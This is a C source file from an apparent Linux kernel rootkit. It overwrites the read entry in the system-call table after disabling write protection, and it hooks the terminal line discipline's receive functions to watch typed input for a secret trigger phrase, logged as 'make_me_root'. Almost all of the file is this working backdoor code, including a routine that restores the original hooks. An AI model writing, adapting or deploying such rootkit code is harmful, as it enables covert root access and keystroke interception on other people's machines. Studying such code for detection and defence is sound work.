#include <linux/tty.h>

#include "common.h"
#include "backdoor.h"
#include "hook.h"

atomic_t receive_buf_count;
atomic_t receive_buf2_count;
struct tty_struct *tty;

void (*current_receive_buf)(struct tty_struct *, const unsigned char *, char *, int);
int (*current_receive_buf2)(struct tty_struct *, const unsigned char *, char *, int);

void
backdoor_read(void)
{
    disable_protection();
    sys_calls[__NR_read] = (void *)g7_read;
    enable_protection();
}

void
backdoor_tty(void)
{
    if (!tty && (tty = get_current_tty())) {
        if (tty->ldisc->ops->receive_buf2) {
            atomic_set(&receive_buf2_count, 0);
            current_receive_buf2 = tty->ldisc->ops->receive_buf2;
            tty->ldisc->ops->receive_buf2 = g7_receive_buf2;
        } else if (tty->ldisc->ops->receive_buf) {
            atomic_set(&receive_buf_count, 0);
            current_receive_buf = tty->ldisc->ops->receive_buf;
            tty->ldisc->ops->receive_buf = g7_receive_buf;
        }
    }
}

void
unbackdoor(void)
{
    if (tty) {
        if (current_receive_buf2) {
            while (atomic_read(&receive_buf2_count) > 0);
            tty->ldisc->ops->receive_buf2 = current_receive_buf2;
            current_receive_buf2 = NULL;
        } else if (current_receive_buf) {
            while (atomic_read(&receive_buf_count) > 0);
            tty->ldisc->ops->receive_buf = current_receive_buf;
            current_receive_buf = NULL;
        }

        tty = NULL;
    }

    if (sys_read) {
        while (atomic_read(&read_count) > 0);
        disable_protection();
        sys_calls[__NR_read] = (void *)sys_read;
        enable_protection();
    }
}


void
g7_receive_buf(struct tty_struct *_tty, const unsigned char *cp, char *fp, int count)
{
    static char *buf = G7_BACKDOOR_MSG;
    static size_t index = 0;

    atomic_inc(&receive_buf_count);

    if (count == 1) {
        // account for `echo` line discipline option by also
        // counting double occurrences of each character (@else)
        if (cp[0] == buf[index]) {
            ++index;
        } else if(!(index && cp[0] == buf[index - 1])) {
            index = 0;
        }

        if (index == strlen(buf)) {
            index = 0;
            DEBUG_INFO("caught 'make_me_root'\n");
        }
    }

    if (current_receive_buf)
        current_receive_buf(_tty, cp, fp, count);

    atomic_dec(&receive_buf_count);
}

int
g7_receive_buf2(struct tty_struct *_tty, const unsigned char *cp, char *fp, int count)
{
    atomic_inc(&receive_buf2_count);
    g7_receive_buf(_tty, cp, fp, count);
    int ret = current_receive_buf2(_tty, cp, fp, count);
    atomic_dec(&receive_buf2_count);
    return ret;
}
